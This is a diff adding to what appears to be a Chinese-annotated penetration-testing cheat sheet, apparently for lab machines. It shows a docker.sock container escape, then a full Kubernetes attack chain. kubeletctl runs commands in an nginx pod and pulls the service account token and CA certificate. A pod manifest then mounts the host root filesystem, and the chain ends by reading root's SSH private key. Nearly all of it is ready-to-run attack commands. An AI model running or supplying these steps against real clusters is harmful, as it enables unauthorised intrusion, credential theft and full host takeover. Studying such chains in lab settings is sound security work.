@@ -149,4 +149,34 @@ docker image ls                                               找可用镜像
 docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash            创建进入容器，chroot 更改进程根目录，启动 bash
 
 
+kubeletctl -i --server 10.129.10.11 scan rce            查看可用 API / rce 命令
+kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx            在 10.129.10.11 node 里的 nginx pos 里的 nginx container 执行 id
+kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token      提取 token
+kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt          提取 证书
+export token=`cat k8.token`
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list                                  列出 权限
+
+privesc.yaml 文件
+————————————
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+————————————
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml            创建新 pod
+kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc                                  提取 root 密钥
 
